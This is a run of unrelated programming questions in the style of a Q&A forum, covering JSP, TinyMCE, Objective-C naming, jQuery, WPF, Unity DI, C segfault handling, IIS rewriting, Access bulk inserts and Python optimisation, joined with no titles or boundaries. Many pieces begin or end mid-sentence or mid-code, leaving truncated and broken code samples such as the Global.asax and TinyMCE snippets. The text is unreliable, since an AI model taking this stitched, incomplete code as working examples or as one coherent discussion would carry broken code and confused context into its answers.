What I want to do is create the HTML templates in JSP to output conditional HTML code, but instead of display this HTML output to the user, I'd like to save this code to several files (which will then be zipped up and delivered to the user, along with images, css files, js files).   I need to know how to create a fake container that will execute a JSP file (process includes and evaluate variables).  </p>

<p>I read about using server filters to intercept the output of JSP code, but I am not sure this will work because a) I need to create several HTML files and b) I need to display different content to the user ( i.e. here's ur zip file, download it) not the output of the JSP being processed.</p>

<p>Thanks!</p>

Everthing is working properly except that in Internet Explorer (8 but I've read it happens on earlier versions), when users type a URL (e.g. www.google.com) it is automatically converted into an HTML link in the TinyMCE editor as they type.  This does not happen in Firefox (3).  How can I prevent IE from doing this?</p>

<p>I've initialized TinyMCE with the following:</p>

<pre><code>tinyMCE.init({
    mode : ""textareas"",
    theme : ""simple"",
    convert_urls : false
 });
</code></pre>

<p>But I don't think convert_urls is intended to affect the behavior I'm describing: <a href=""http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/convert_urls"" rel=""nofollow noreferrer"">http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/convert_urls</a></p>

    return url;
}

tinyMCE.init({
    mode : ""textareas"",
    theme : ""simple"",
    urlconverter_callback : ""myCustomURLConverter""
 });
</code></pre>

<p>But similarly I think this is just a way to affect how/whether URLs are converted upon load/save, not to prevent them from being converted to links as users type:

<p>In C++ I used to use the <code>m_</code> prefix for ivars a lot. In C# I followed the convention of disambiguating purely by use of <code>this.</code> for ivars. I've since adopted the equivalent in C++ too (<code>this-></code>). </p>

<p>In Objective C I've tried a few things but none have really seemed satisfactory.</p>

<p>Unless someone suggests something really nice I am resigned to the fact that I'll have to compromise (but please, don't make me use the <code>the</code> prefix for args!), so I'm interested to hear what the majority say - especially from those who have been using ObjC for a while.</p>

<p>I did some due diligence before posting this and a couple of good resources I found where:</p>

<li><a href=""http://www.cocoabuilder.com/archive/message/cocoa/2008/4/3/203139"" rel=""noreferrer"">This thread</a> (a lot of ex C++ coders in there)</li>
</ul>

<p>They give me some ideas, but I'm still keen to hear what others are doing.</p>

<p>[edit]
Just to clarify: It's specifically how you distinguish ivars from method args that I'm looking for - whether that's through prefixes or some other technique.</p>

<p>[edit 2]
Thanks for all the responses and discussion points. I'm not closing this, but will just say that, as I indicated in my comments to the accepted answer, I've gone with the convention of prefixing init args with <code>the</code> (and setter args with <code>new</code>, which I was doing anyway). This seems to be the best balance of forces - even if I'm not keen on the aesthetic myself.</p>

<p>I have an image, and I would like to do several things with it.
When a user clicks on a 'Zoom' icon, I'm running the 'imagetool' plugin (<a href=""http://code.google.com/p/jquery-imagetool/"" rel=""nofollow noreferrer"">http://code.google.com/p/jquery-imagetool/</a>) to load a larger version of the image. The plugin creates a new div around the image and allows the user to pan around.</p>

<p>When a user clicks on an alternative image, I'm removing the old one and loading in the new one.</p>

<p>The problem comes when a user clicks an alternative image, and then clicks on the zoom button - the imagetool plugin creates the new div, but the image appears after it...</p>

<p>The code is as follows:</p>

<pre><code>// Product Zoom (jQuery)
$(document).ready(function(){
$(""#productZoom"").click(function() {

    // Set new image src
    var imageSrc = $(""#productZoom"").attr(""href"");
    $(""#productImage"").attr('src', imageSrc);   

    // Run the imagetool plugin on the image
    $(function() {
        $(""#productImage"").imagetool({
            viewportWidth: 300,
            viewportHeight: 300,
            topX: 150,
            topY: 150,
            bottomX: 450,
            bottomY: 450
        });
    });
    return false;
});
});


// Alternative product photos (jQuery)
$(document).ready(function(){
$("".altPhoto"").click(function() {

    $('#productImageDiv div.viewport').remove();
    $('#productImage').remove();

    // Set new image src
    var altImageSrc = $(this).attr(""href"");

    $(""#productZoom"").attr('href', altImageSrc);

    var img = new Image();
    $(img).load(function () {
        $(this).hide();
        $('#productImageDiv').append(this);
        $(this).fadeIn();
    }).error(function () {
        // notify the user that the image could not be loaded
    }).attr({
        src: altImageSrc,
        id: ""productImage""
        });

    return false;       
});
});
</code></pre>

<p>It seems to me, that the imagetool plugin can no longer see the #productImage image once it has been replaced with a new image... So I think this has something to do with binding? As in because the new image is added to the dom after the page has loaded, the iamgetool plugin can no longer use it correctly... is this right?
If so, any ideas how to deal with it?</p>

"438795","1","","","2009-01-13 12:31:18","","5","9161","<p>I have created a very simple test app to try and solve this problem described to me by a co-worker.  He was able to trigger it in C#, but I believe he needed the solution to be more generic and wanted it to be done strictly in the XAML.  The problem was: How do you trigger the Storyboard inside of a UserControl to begin in response to an event on a control in the containing Window (the parent doesn't have to be a Window, it can be a Page or another UserControl...I use a Window for simplicity).  So, my best example is that you have a Window with a Button and an instance of your UserControl.  You want the Click event of the Button to trigger a Storyboard inside of the UserControl to begin.</p>

<p>Inside of the UserControl itself, the Storyboard is declared as a Resource with the key of MyStoryboard.  I created a Button with an EventTrigger to show that I could trigger the Storyboard by referencing it with a Binding expression.  Here is the complete XAML for my UserControl:</p>

<pre><code>&lt;UserControl x:Class=""UserControlStoryboard.UserControl1""
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
Height=""300"" Width=""300""&gt;
&lt;UserControl.Resources&gt;
    &lt;Storyboard x:Key=""MyStoryboard""&gt;
        &lt;ColorAnimation Storyboard.TargetName=""grid"" Storyboard.TargetProperty=""(Grid.Background).Color"" From=""CadetBlue"" To=""White"" Duration=""0:0:2"" /&gt;
    &lt;/Storyboard&gt;
&lt;/UserControl.Resources&gt;
&lt;Grid Background=""CadetBlue"" x:Name=""grid""&gt;
    &lt;Button Content=""Press Me"" Height=""50""&gt;
        &lt;Button.Triggers&gt;
            &lt;EventTrigger RoutedEvent=""Button.Click""&gt;
                &lt;BeginStoryboard&gt;
                    &lt;BeginStoryboard.Storyboard&gt;
                        &lt;Binding RelativeSource=""{RelativeSource FindAncestor, AncestorType={x:Type UserControl}}"" Path=""Resources[MyStoryboard]"" /&gt;
                    &lt;/BeginStoryboard.Storyboard&gt;
                &lt;/BeginStoryboard&gt;
            &lt;/EventTrigger&gt;
        &lt;/Button.Triggers&gt;
    &lt;/Button&gt;            
&lt;/Grid&gt;
</code></pre>

<p></p>

<p>I was hoping that since I was able to tell a Storyboard to begin by referencing it with a Binding expression that I should be able to do the exact same thing from a Window that contains this UserControl as a child element.  But I can't seem to figure out how to get a reference to the Storyboard inside of the parent Window.  Is this impossible to accomplish in XAML only?</p>

<p>The parent window in my test project has nothing but a button and an instance of this UserControl.  If it's even possible, which element would let me add an EventTrigger where the source of the event is the Button and the trigger action tells the UserControl's Storyboard to begin?</p>

<p>Thanks.</p>

In order to define a valid contract, the specified type (either contract interface or service class) must be attributed with ServiceContractAttribute.""</p>

<p>I know I'm missing something simple here.  I have the interface clearly marked as a service contract and there's a reference to that project in the Host project.</p>

<p>Notice that these errors are coming from the legacy code, not my code - app_main.obj is part of the legacy code, while mymain.c is my source.  I've done some searching around, and what that I've read says that this type of error is caused by a mismatch with the -MD switch between my code and the library that I'm linking to.  Since I'm dealing with legacy code, a solution has to come from my environment. It's been a long time since I've done C++ work, and even longer since I've used Visual Studio, so I'm hoping that this is just some ignorance on my part.  Any ideas on how to get these resolved?</p>

<pre><code>public interface IPersonRepository
{
  Person GetByID(ObjectSpace objectSpace, int id);
}
</code></pre>

<p>Using this pattern I am able to have multiple threads (it's a web app) using the same repository instance at the same time despite the fact that each thread is using a different <code>ObjectSpace</code> (which is a local cache + mechanism for fetching objects from the DB + a unit of work etc).  But this makes me feel ""dirty"", and not the good kind :-)</p>

<p>What I would really like is:</p>

<pre><code>public interface IPersonRepository
{
  Person GetByID(int id);
}
</code></pre>

<p>To achieve this I would have to create a child container and use <code>RegisterInstance</code> to register my <code>ObjectSpace</code>. This would work fine as long as I either:</p>

<ol>
<li>Register <code>IPersonRepository</code> in the child container instead</li>
<li>Change the lifetime manager to <code>TransientLifetimeManager</code></li>
</ol>

<p>I don't want to do either. (1) Would just be too much work, I want to register once in the parent container and then no more. (2) Would work but if there are a lot of dependencies then all of these would have to be transient too and this would result in a lot of instances being created every time I needed the person repository.</p>

<p>So my question is: Is there a way to register the type in the parent, but to have a container lifetime instance resolved and stored in the child container instead of the parent container?  Maybe there is a way using a custom lifetime manager or something?</p>

<p>What I would like to achieve is this:</p>

<pre><code>UnityContainer unityContainer = new UnityContainer();
//Might be a custom manager or something
unityContainer.RegisterType&lt;IPersonRepository, PersonRepository&gt;
  (new ContainerControlledLifetimeManager()); 
using (var childContainer = unityContainer.CreateChildContainer())
{
    childContainer.RegisterInstance&lt;ObjectSpace&gt;(new MyObjectSpace());
    //01 Resolves a new instance inside the child container
    var repository = childContainer.Resolve&lt;IPersonRepository&gt;();
    //02 resolves same instance as 01
    repository = childContainer.Resolve&lt;IPersonRepository&gt;();
}

using (var childContainer = unityContainer.CreateChildContainer())
{
    childContainer.RegisterInstance&lt;ObjectSpace&gt;(new MyObjectSpace());
    //03 Resolves a new instance inside the child container
    var repository = childContainer.Resolve&lt;IPersonRepository&gt;();
    //04 resolves same instance as 03
    repository = childContainer.Resolve&lt;IPersonRepository&gt;(); //Resolves the same instance
}

I know this happens, but I can't easily check ahead of time to see whether it segfaults or not - either I can ""pre-scan"" input data to see if it will cause a segfault (which can be impossible to determine), or I can refit it to not use pointer arithmetic, which would require a significantly larger amount of work, or I can try to catch a segfault. So my question:</p>

<p>1) How, in C, can I catch a segfault? I know <em>something</em> in the OS causes a segfault, but what can a C program do in the event that it segfaults to die a bit more gracefully than just <code>Segmentation fault</code>?</p>

<p>2) How portable is this?</p>

<p>I imagine this is a highly unportable behavior, so if you post any code to catch a segfault, please tell me what it works on. I'm on Mac OS X but I'd like my program to work on as many platforms as it can and I want to see what my options are.</p>

<p>And don't worry - basically all I want to do is print a more user-friendly error message and free some <code>malloc()</code>ed memory, and then die. I'm not planning on just ignoring all segfaults I get and plowing ahead.</p>

  public void addToList(myOtherClass tmp)
  {
    anewList.Add(tmp);

<p>So I call ""addToList"" a hundred times, each adding a unique item to the list.  I've tested my items to show that before I run the ""addToList"" method, they are unique.  I even put a line in to test ""tmp"" to make sure it was what I was expecting.</p>

<p>However, when I do this (lets say myClass object is called tmpClass):</p>

<pre><code>int i = tmpClass.anewList.Count();
for (int j = 0; j&lt;i; j++)
{
   //write out each member of the list based on index j...
}
</code></pre>

<p>I get the same exact item, and it's the last one that was written into my list.  It's as if when I add, I'm overwriting the entire list with the last item I've added.  </p>

<p>Help?  This makes no sense.
I've also tried List.Insert, where I'm always inserting at the end or at index 0.  Still no dice.  Yes, I'm doubly source my indexing is correct and when I do my test I'm indexing through each of the elements.</p>

<p>:)</p>

<p>UPDATE:
Okay, I tried this and still had the same problem:</p>

<pre><code>foreach(myOtherClass tmpC in tmpClass.anewList)
{    
    Console.WriteLine(tmpC.theStringInMyClass.ToString());
}

<p>and still for each of the 100 items, I got the same string output... I'm sure I'm doing something completely stupid, but I don't know what yet. I'm still 100% sure that the right string is getting passed in to begin with.</p>

Usually you would try to set up some breakpoints before the exception is thrown and hope that you are able to determine the situation that leads up to that exception.</p>

<p>In Eclipse, a breakpoint may have an expression defined where it is only triggered when, for example, variable x equals value y. My question is, is it possible to define some kind of global expression where, once an exception is thrown, it is caught by the debugger, allowing the programmer to inspect all variables immediately? Ideally you would not have hit the catch block yet, Eclipse would catch the exception being raised and stop execution without changing the stack contents.</p>

<p>To achive this extensionless rewrite with IIS6 and no access to the hosting-server I use the ""404-approach"". When a request that the server can't find, the mapped 404-page is executed, since this is a aspx-page the rewrite can be performed (I can setup the 404-mapping using the controlpanel on the hosting-service).</p>

<p>This is the code in Global.asax:</p>

<pre><code>protected void Application_BeginRequest(object sender, EventArgs e)
{
    string url = HttpContext.Current.Request.Url.AbsolutePath;
    if (url.Contains(""404.aspx""))
    {

                StoreRequestURL(requestURL);
            }
            else if (requestURL.Contains(""/picture/""))
            {
                HttpContext.Current.RewritePath(""~/showPicture.aspx?pictureID="" + GetPageID(requestURL));
                StoreRequestURL(requestURL);
            }
        }
    }
}

private void StoreRequestURL(string url)
{
    url = url.Replace(""http://"", """");
    url = url.Substring(url.IndexOf(""/""));
    HttpContext.Current.Items[""VirtualUrl""] = url;
}

private string GetPageID(string requestURL)
{
    int idx = requestURL.LastIndexOf(""/"");
    string id = requestURL.Substring(idx + 1);
    id = id.Replace("".aspx"", """"); //Only needed when testing without the 404-approach
    return id;
}
</code></pre>

<p>And in Page_Load on my masterpage I set the correct URL in the action-attribute on the form-tag.</p>

<pre><code>protected void Page_Load(object sender, EventArgs e)
{
    string virtualURL = (string)HttpContext.Current.Items[""VirtualUrl""];

<p>The rewrite works fine but when I perform a postback on the page the postback isn't executed, can this be solved somehow?</p>

<p>The problem seems to be with the 404-approach because when I try without it (and loses the extensionless-feature) the postback works. That is when I request:<br>
<em><a href=""http://mysite.com/users/john.aspx"" rel=""nofollow noreferrer"">http://mysite.com/users/john.aspx</a></em>  </p>

<p>One of our new security requirements is to only allow an account to have one active session at a time. So any time a user logs in, we will check to see if the login credentials are already active, and preferably prevent the new user from logging in again until the other session ends. Alternatively we could force the other session to end, if that would be easier to implement.</p>

<p>Is there a simple way to do this with Forms Authentication? We've considered a custom approach where we track each session in the database, but it would be a lot of work and we'd probably have to modify all of our applications to detect the session_end, which I'm hoping to avoid. I figure there has to be something in Forms Auth that handles this.</p>

<p>I've seen the MembershipUser.IsOnline() method, which seems ideal, but we're not using a Membership provider.</p>

<p>UPDATE: Just to be clear, I do not need to check whether the current user is logged in, I need to know if somebody else is already logged in using the same account.</p>

<p>I'm writing a Django application, and so far have only created the models (and customised the admin application). This is how I've written the skeletons of my tests so far:</p>

<p>I planned to write a function to test each model within the ModelTests class. Is this a good way of writing tests? Also, what exactly should I be testing for? That creating a model with all of the fields completed works? That a half complete model fails? That any special cases are tested (like a null and is_required=False)? I've trust in the ORM, which as far as I'm aware is heavily tested, so I shouldn't need to test all of the methods should I?</p>

<p>I re-downloaded the Ajax Control Toolkit for the sample sites, opened the solution in VS, ran the sample for the TabContainer, and it worked fine.

<p>There is one more issue, but I don't know whether it's related. I just recently installed Visual Studio 2008. As soon as I opened my website, VS automatically created the tab ""AJAX Controls"" in the toolbox and filled it with all the ajax controls.

<p>However, when I opened the sample website, Visual studio created another tab in the toolbox - ""AjaxControlToolkit Components"", filled with all the same controls as in ""AJAX Controls"". I don't know why it added the same controls twice (but, strangely enough, with different icons for them in the toolbox).

<p>I am looking for any advice regarding best practices considering our requirements (listed below) and any additional heads-up for common pitfalls or specific issues I should be giving special consideration. The payment gateway we will be using is <a href=""http://www.paymentExpress.com.au"" rel=""noreferrer"">PaymentExpress</a> as it's one of the few supported gateways that has recurring billing and doesn't have any special conditions for companies operating outside of the USA. The business behind this application is based out of the UK.</p>

<p>Users of the application create an account with a sub-domain where they can access and customise the application and their data. Below are some of the requirements/features that might have an effect on how billing works:</p>

<ul>
<li>All users get a 30 day trial</li>
<li>There are different plans, including a free one</li>
<li>Higher priced plans have larger limits on the amount of data (e.g. users, projects,  etc) they can have in their account</li>
<li>Billing period will be monthly, beginning after trial</li>
<li>There will be discounts/coupon codes to get a percentage off the normal price for a year on plans, etc.</li>
<li>Plan pricing will change as features are added</li>
</ul>

<p>Specific hurdles I can foresee will be things including the following:</p>

<ul>
<li>How to handle downgrading when they violate the plan limits for lower level plans.</li>
<li>Behaviour when credit cards expire or payments don't go through (a read-only mode enforced, perhaps)</li>
<li>When plan pricing changes, we want to honour previous prices for existing users for a time period (such as 6 months), then start charging higher rates. If the plan price decreases, it will take effect immediately.</li>
</ul>

<p>Other advice that would be helpful would be anything regarding flow of the application. How should billing forms be presented to the user? When should credit card information be required? How should invoices be sent, stored, and accessible?</p>

<p>I should disclose that we plan to base a lot of the code base off <a href=""http://github.com/maccman/saasy/tree/master"" rel=""noreferrer"">SaaSy</a>. SaaSy is designed to be used as a separate Rails app that handles all the signup and account management side of things. However, this doesn't work for us since we never planned for this from the beginning and it would be a tedious process to adapt our application to work like that. Consequently, we'll be pulling code and ideas from SaaSy and merging them into our app, a considerably less tedious task.</p>

<p>I'd like to be able to include XMLHttpRequest queries on every page as a method of dynamically loading content (ie JSON) or behaviour (like eval()ed Javascript) relevant to the type of page, but wanted to make sure that the resources it receives from the server could be cached, if the server sent the right headers.</p>

<p>I was concerned to read <a href=""http://www.subbu.org/blog/2005/10/xmlhttprequest-and-caching"" rel=""noreferrer"">this article which mentions</a> that browsers such as Firefox 1.1 do not cache any content obtained via XMLHTTPRequest, and that it always requests new data is sent completely (with Cache-Control and no If-Modified-Since) regardless of headers sent by the server.</p>

<p>Obviously that article is very old - I don't even remember a Firefox 1.1; so what are the considerations I need to make for current popular browsers and is there any trick for when I specifically <em>want</em> responses to be cached?</p>

<p>**To clarify my question, by caching, I mean client-side caching, where the server issues freshness information (in the form of a Cache-Control: max-age directive or an Expires: header) and the browser stores a copy of the response in its cache along with an expiry date, so that future requests for the same resource issued from subsequent pages can be satisfied from the browser cache without the need for any contact with the server at all.  All major browsers do this correctly for most content, but I've heard that Firefox cannot do this for XMLHttpRequest content.  What I'm asking is if anyone knows of cases where any of the modern browsers do not cache responses according to the spec when using XMLHttpRequest.*</p>

I know that <a href=""http://www.postsharp.org/"" rel=""noreferrer"">PostSharp</a> makes this possible but I find it incredibly wasteful that the developler of PostSharp basically had to rewrite the functionality of the whole <code>System.Reflection</code> namespace in order to make existing assemblies modifiable.</p>

<p><code>System.Reflection.Emit</code> only allows the creation of new, dynamic assemblies. However, all the builder classes used here inherit from the basic reflection classes (e.g. <code>TypeBuilder</code> inherits from <code>System.Type</code>). Unfortunately, there doesn't seem to be a way to coerce an existing, dynamically loaded type into a type builder. At least, there's no official, supported way.</p>

<p>So what about unsupported? Does anyone know of backdoors that allow to load existing assemblies or types into such builder classes?</p>

<p>Mind, I am <strong>not</strong> searching for ways to modify the current assembly (this <em>may</em> even be an unreasonable request) but just to modify existing assemblies loaded from disc. I fear there's no such thing but I'd like to ask anyway.</p>

<p>In the worst case, one would have to resort to <code>ildasm.exe</code> to disassemble the code and then to <code>ilasm.exe</code> for reassembly but there's no toolchain (read: IL reader) contained in .NET to work with IL data (or is there?).</p>

<p>/EDIT:</p>

<p>I've got no specific use case. I'm just interested in a general-purpose solution because patching existing assemblies is a quite common task. Take obfuscators for example, or profilers, or AOP libraries (yes, the latter <em>can</em> be implemented differently). As I've said, it seems incredibly wasteful to be forced to rewrite large parts of the already existing infrastructure in <code>System.Reflection</code>.</p>

<hr>

<h2>@Wedge:</h2>

<p>You're right. However, there's no specific use case here. I've modified the original question to reflect this. My interest was sparked by another question where the asker wanted to know how he could inject the instructions <code>pop</code> and <code>ret</code> at the end of every method in order to keep Lutz Roeder's Reflector from reengineering the (VB or C#) source code.</p>

<p>Now, this scenario can be realized with a number of tools, e.g. PostSharp mentioned above and the <a href=""http://sebastien.lebreton.free.fr/reflexil/"" rel=""noreferrer"">Reflexil</a> plugin for Reflector, that, in turn, uses the <a href=""http://www.mono-project.com/Cecil"" rel=""noreferrer"">Cecil</a> library.</p>

<p>All in all, I'm just not satisfied with the .NET framework.</p>

<h2>@Joel:</h2>

<p>Yes, I'm aware of this limitation. Thanks anyway for pointing it out, since it's important.</p>

<h2>@marxidad:</h2>

<p>This seems like the only feasible approach. However, this would mean that you'd still have to recreate the complete assembly using the builder classes, right? I.e. you'd have to walk over the whole assembly manually.</p>

<p>Hmm, I'll look into that.</p>

<p>For some cases I need to mock the WCF service, since getting the desired behaviour from the service sometimes is tough (e.g. service throws special exceptions).</p>

<p>I could add yet another interface to the wcf client, but this seems a bit silly, since the client calls already are using an interface.</p>

<p>Is there an easy way to mock a WCF service? Easier than creating another interface layer and redirecting every single WCF call inside it?</p>

<p>Edit: Most of the answers seem not to know much about WCF service using, so some clarification:<br>
To use a WCF service from a ViewModel, I have to manage the connection something like this:</p>

<pre><code>ChannelFactory&lt;IMyWcfService&gt; channelFactory = new ChannelFactory&lt;IMyWcfService&gt;("""");
IMyWcfService proxy = channelFactory.CreateChannel();
proxy.CallMyStuff();
proxy.Close();
</code></pre>

<p>I can't just pass the ViewModel the proxy to the WCF, since the connection needs to be opened and closed for every transaction. For this reason using RhinoMock/NMock would not work, since they need a ViewModel which gets the proxy as a parameter, which can't be done like this if you use WCF.</p>

<p>This has all been very Greek to me until recently, when I realized that there is something called the 'master theorem' used to write the 'recurrence' for problems or programs. I've been reading through the wikipedia page, but, as usual, things are worded in such a way that I don't really understand what it's talking about. I learn much better with examples.</p>

<p>So, a few questions:
Lets say you are given this recurrence:</p>

<blockquote>
  <p>r(n) = 2*r(n-2) + r(n-1);<br>
  r(1) = r(2)
  = 1</p>
</blockquote>

<p>Is this, in fact, in the form of the master theorem? If so, in words, what is it saying? If you were to be trying to write a small program or a tree of recursion based on this recurrence, what would that look like? Should I just try substituting numbers in, seeing a pattern, then writing pseudocode that could recursively create that pattern, or, since this may be in the form of the master theorem, is there a more straightforward, mathematical approach?</p>

<p>Now, lets say you were asked to find the recurrence, T(n), for the number of additions performed by the program created from the previous recurrence. I can see that the base case would probably be T(1) = T(2) = 0, but I'm not sure where to go from there.</p>

<p>Basically, I am asking how to go from a given recurrence to code, and the opposite. Since this looks like the master theorem, I'm wondering if there is a straightforward and mathematical way of going about it.</p>

<p>EDIT: Okay, I've looked through some of my past assignments to find another example of where I'm asked, 'to find the recurrence', which is the part of this question I'm having the post trouble with.</p>

<blockquote>

<p>One of the questions can take multiple answers in the form of Checkboxes as shown in the picture below. The question is in Greek so I have added some Choice1, Choice2, Choice3 etc next to each answer in order to facilitate my question.</p>

<p><img src=""https://i.stack.imgur.com/N9jo0.png"" alt=""enter image description here""></p>

<p>In my data when someone chose lets say Choice1 and Choice2,
I will have an answer which is the concatenation of the strings he checked seperated with commas.</p>

<p>In this case it would be: </p>

<blockquote>
  <p>Choice1, Choice2</p>
</blockquote>

<p>If someone else checked Choice1, Choice2 and Choice4
his answer in my data would be:</p>

<blockquote>
  <p>Choice1, Choice2, Choice4</p>
</blockquote>

<p>The problem is SPSS has no way of seperating the substrings (seperated by commas) and understanding which Choices each case has in common. Or maybe there is a way but I don't know it :)</p>

<p>When I, for example, do a simple frequency analysis for this question it produces a table that perceives  </p>

<blockquote>
  <p>Choice1, Choice2</p>
</blockquote>

<p>as a completely different case from </p>

<blockquote>
  <p>Choice1, Choice2, Choice4</p>
</blockquote>

<p>Ideally I would like to somehow tell SPSS to count the frequency of each unique Choice (Choice1, Choice2, Choice3 etc etc) rather than each unique combination of those Choices.
Is that possible? And if it is can you point me to the documentation I need to study to make it happen?</p>

I currently have the entire kernel compiled down as C code, and I've managed to get it displaying text in the console window and all of that fine goodness. Now, I want to start accepting keyboard input so I can actually make some use of the thing and get going on process management.</p>

<p>I'm using DJGPP to compile, and loading with GRUB. I'm also using a small bit of assembly which basically jumps directly into my compiled C code and I'm happy from there.</p>

<p>All the research I've done seems to point to an ISR at $0x16 to read in the next character from the keyboard buffer. From what I can tell, this is supposed to store the ASCII value in ah, and the keycode in al, or something to that effect. I'm attempting to code this using the following routine in inline assembly:</p>

<pre><code>char getc(void) 
{
    int output = 0;

    //CRAZY VOODOO CODE
    asm(""xor %%ah, %%ah\n\t""
        ""int $0x16""
        : ""=a"" (output)
        : ""a"" (output)
        : 

        );

    return (char)output;
}
</code></pre>

<p>When this code is called, the core immediately crashes. (I'm running it on VirtualBox, I didn't feel the need to try something this basic on real hardware.)</p>

<p>Now I have actually a couple of questions. No one has been able to tell me if (since my code was launched from GRUB) I'm running in real mode or protected mode at the moment. I haven't made the jump one way or another, I was planning on running in real mode until I got a process handler set up.</p>

<p>So, assuming that I'm running in real mode, what am I doing wrong, and how do I fix it? I just need a basic getc routine, preferably non-blocking, but I'll be darned if google is helping on this one at all. Once I can do that, I can do the rest from there.</p>

<p>I guess what I'm asking here is, am I anywhere near the right track? How does one generally go about getting keyboard input on this level? </p>

<p>EDIT: OOhh... so I'm running in protected mode. This certainly explains the crash trying to access real mode functions then.</p>

<p>So then I guess I'm looking for how to access the keyboard IO from protected mode. I might be able to find that on my own, but if anyone happens to know feel free. Thanks again.</p>

So, what do you do if you've already inherited from some other class (your domain model requirements)?</p>

<p>I know you can create private functions in a controller by naming them with a leading underscore (_myfunc), but then the variables in the function are out of scope for the calling controller function.  So you have to return all the needed data from the function which is a hassle. </p>

One opportunity for improvement is to move logic in switch statements to separate functions (delete, preview, order, etc). But I'm trying to decide on the next step after that.

The table contains some integer fields, one float field and one text field with only one character. There is a primary key on one of the integer fields (which is not autoinc) and two indexes on another integer and the float field.</p>

<p>Inserting the data using <code>AdoTable.AppendRecord(...)</code> takes > 10 Minutes which is not acceptable since this is done every time the user starts using a new database with the program. I cannot prefill the table because the data comes from another database (which is not accessible through <code>ADO</code>).</p>

<p>I managed to get down to around 1 minute by writing the records to a tab separated text file and using a <code>tAdoCommand</code> object to execute</p>

<pre><code>insert into table (...) select * from [filename.txt] in ""c:\somedir"" ""Text;HDR=Yes""
</code></pre>

<p>But I don't like the overhead of this.</p>

<p>There must be a better way, I think.</p>

<p>EDIT:</p>

<p>Some additional information:</p>

<ul>
<li>MS Access was chosen because it does not need any additional installation on the target machine(s) and the whole database is contained in one file which can be easily copied.</li>
<li>This is a single user application.</li>
<li>The data will be inserted only once and will not change for the lifetime of the database. Though, the table contains one additional field that is used as a flag to indicate that the corresponding record in another database has been processed by the user.</li>
<li>One minute <em>is</em> acceptable (up to 3 minutes would be too) and my solution works, but it seems too complicated to me, so I thought there should be an easier way to do this.</li>
<li>Once the data has been inserted, the performance of the table is quite good.</li>
<li>When I started planning/implementing the feature of the program working with the Access database the table was not required. It only became necessary later on, when another feature was requested by the customer. (Isn't that always the case?)</li>

<p>EDIT:</p>

<p>From all the answers I got so far, it seems that I already got the fastest method for inserting that much data into an Access table. Thanks to everybody, I appreciate your help.</p>

Then I thought: the important thing isn't that it's a particularly <em>good</em> representation of trees, but that it is one that everyone agrees on.  Just like ASCII.  And once established, it's hard to displace due to network effects.  The new alternative would have to be much better (maybe 10 times better) to displace it. Of course, ASCII has been (mostly) replaced by Unicode, for internationalization. </p>

<p>According to <a href=""http://www.google.com/trends?q=xml%2Cjson&amp;ctab=0&amp;geo=all&amp;date=all&amp;sort=1"" rel=""noreferrer"">google trends</a>, XML has a x43 lead, but is declining - while JSON grows.</p>

<hr>

<p><em>NOTES:</em>
S-expressions (from lisp) are another representation of trees, but which has not gained mainstream adoption.  There are many, many other proposals, such as YAML and Protocol Buffers (for binary formats).</p>

<p>I can see JSON dominating the space of communicating with client-side AJAX (AJAJ?), and this possibly could back-spread into other systems transitively.</p>

<p>XML, being based on SGML, is better than JSON as a <em>document format</em>.  I'm interested in XML as a <em>data format</em>.</p>

<p>XML has an established ecosystem that JSON lacks, especially ways of defining formats (XML Schema) and transforming them (XSLT).  XML also has many other standards, esp for web services - but their weight and complexity can arguably count against XML, and make people want a fresh start (similar to ""web services"" beginning as a fresh start over CORBA).</p>

</code></pre>

<p>I thought wouldn't it be better to calculate the value of len(jokes) once outside the list comprehension?</p>

<p>Well I tried it and timed three codes</p>

<pre><code>jv@Pioneer:~$ python -m timeit -s 'jokes=range(1000000);domain=[(0,(len(jokes)*2)-i-1) for i in range(0,len(jokes)*2)]'

jv@Pioneer:~$ python -m timeit -s 'jokes=range(1000000);l=len(jokes);domain=[(0,(l*2)-i-1) for i in range(0,l*2)]'
10000000 loops, best of 3: 0.0343 usec per loop
jv@Pioneer:~$ python -m timeit -s 'jokes=range(1000000);l=len(jokes)*2;domain=[(0,l-i-1) for i in range(0,l)]'
10000000 loops, best of 3: 0.0333 usec per loop
</code></pre>

<p>Observing the marginal difference 2.55% between the first and the second made me think - is the first list comprehension </p>

<pre><code>domain=[(0,(len(jokes)*2)-i-1) for i in range(0,len(jokes)*2)]
</code></pre>

<p>optimized internally by python? or is 2.55% a big enough optimization (given that the len(jokes)=1000000)?</p>

<p>If this is - What are the other implicit/internal optimizations in Python ?</p>

<p>What are the <code>developer's rules of thumb for optimization in Python</code>?</p>

<p><strong>Edit1</strong>: Since most of the answers are ""don't optimize, do it later if its slow"" and I got some tips and links from <code>Triptych</code> and <code>Ali A</code> for the <strong>do's</strong>.
I will change the question a bit and request for <strong>don'ts</strong>. </p>

<p>Can we have some experiences from people who faced the '<strong>slowness</strong>', what was the problem and how it was corrected? </p>

<p>Effectively, what I want to find is a way of defining a single route that takes a single parameter.</p>

<p>The common examples I have found online is all based around the example</p>

<pre><code>routes.MapRoute(
    ""Default"",
    ""{controller}.mvc/{action}/{id}""
    new { controller = ""Default"", action=""Index"", id=""""});
</code></pre>

<p>By mapping this route, you can map to any action in any controller, but if you want to pass anything into the action, the method parameter must be called ""id"". I want to find a way around this if it's possible, so that I don't have to constantly specify routes just to use a different parameter name in my actions.</p>

<p>Has anyone any ideas, or found a way around this?</p>

<p>The original deployment has custom workflows that have been updated in phase 2.<br>
<strong>Is there a ""How-To"" for this type of situation?</strong></p>

<p>Some of the pitfalls we have seen requires you to mark the original workflow to not accept any new instances, then deploy its update as a new worflow.  This would allow the previous items to finish processing under the old code and any new processes to spin up the new workflow.  </p>

<p>One problem with this is we would then have to visit each site where the original workflow was attached and attach the new workflowV2.  Now we have two workflow status columns in the doc library.    </p>

<p>I am just getting into the project and these are problems the devs have noticed.  </p>

<p><strong>Any resources or hints you can throw at me would be appreciated as I am learning all of this as I go.</strong></p>

<p>Here are some notes up from another dev who is giving me some background as to what he has seen:</p>

<blockquote>
  <p>If a version of a workflow already exists, then redeploying it as a feature will cause the existing workflow to have its status set to “No New Instances”. This can be seen by going to a document library where the workflow has been attached, select Settings -> Document Library Settings -> Workflow settings -> Remove a workflow and noting the radio button setting for the workflow.  Any current, in work, workflows instances will still complete as normal, but this setting will prevent any new instances of the workflow.  </p>
  
